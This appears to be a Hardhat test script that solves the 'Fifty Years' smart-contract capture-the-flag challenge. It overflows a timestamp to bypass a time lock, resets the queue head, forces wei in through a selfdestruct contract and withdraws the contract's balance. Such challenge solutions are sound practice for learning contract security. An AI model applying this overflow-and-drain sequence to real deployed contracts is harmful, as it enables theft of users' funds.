import { assert, expect } from "chai";
import { ethers } from "hardhat";
import { utils } from "mocha";

const sleep = (timeToSleepInSecs: number) => new Promise((resolve) => {
  setTimeout(resolve, timeToSleepInSecs * 1000);
})

describe("Executing", function () {
  it("Solo hay que llamar al exploit", async function () {
    const hre = require("hardhat");
    const accounts = await hre.ethers.getSigners();
    // Attach to contracts
    const toa="0x5e4E68EcA47532c4F3337cf4a5aCe8E2210CAa98";
    const challengeContract = await (await ethers.getContractFactory("FiftyYearsChallenge")).attach(toa);
  
    console.log("Explotando!!!");
    //First, we create a new queue entry calling upsert preparing a bypass to the timestamp check. 
    //We choose the timestamp value such that it would overflow queue[queue.length - 1].unlockTimestamp + 1 days in a way to equal zero.
    var tx;
    console.log("010");
    const ONE_DAYS_IN_SECONDS = 24 * 60 * 60;
    const DATE_OVERFLOW = ethers.BigNumber.from("2")
      .pow("256")
      .sub(ONE_DAYS_IN_SECONDS);
    const ZERO = "0"; // will be head value
    
    tx = await challengeContract.upsert("1", DATE_OVERFLOW.toString(), {
      value: "1",
    });
    sleep(15);

    //Our head variable is a garbage value and we need to reset it to 0 so we can withdraw the first entry 
    //with the 1 ether amount. We chose the previously added queue item in a way such that it overflows the
    //timestamp check when we call upsert a second time with timestamp = 0. 
    //This resets the head pointer to zero and pushes a queue item with a timestamp in the past.
    console.log("020");
    tx = await challengeContract.upsert("2", ZERO, {
      value: "2",
    });
    sleep(15);

    // we cannot withdraw all of it now because the contract only contains 1 + 2 = 3 wei
    // but new queue items' .amount sums up to 2 + 3 = 5 wei
    // so need to add at least 2 more wei
    // use a selfdestruct wei transfer bypass first to get to the correct balance
    console.log("030");
    //const toa2="0x90a94EAd79E5dAA54A4f185CbD38721Bd49ed909";
    const toa2="0x7E05bfeF588221dAe3a0550F6357c9556cE1C4dB";
    const attackerFactory = await (await ethers.getContractFactory("exploit")).attach(toa2);
    tx=await attackerFactory.kill();
    //console.log("040");

    tx = await challengeContract.withdraw(0,{gasLimit:120000,gasPrice:51839704795}); 

    //Si quedan wei entonces ejecutar las siguientes tres lineas por cada wei que queda
    console.log("010");
    tx = await challengeContract.upsert("1", DATE_OVERFLOW.toString(), {value: "0",gasLimit:120000});
    tx = await challengeContract.upsert("2", ZERO, {value: "0",gasLimit:120000});
    tx = await challengeContract.withdraw(0,{gasLimit:120000,gasPrice:51839704795}); 

    expect(await challengeContract.isComplete()).to.be.true;
  });
});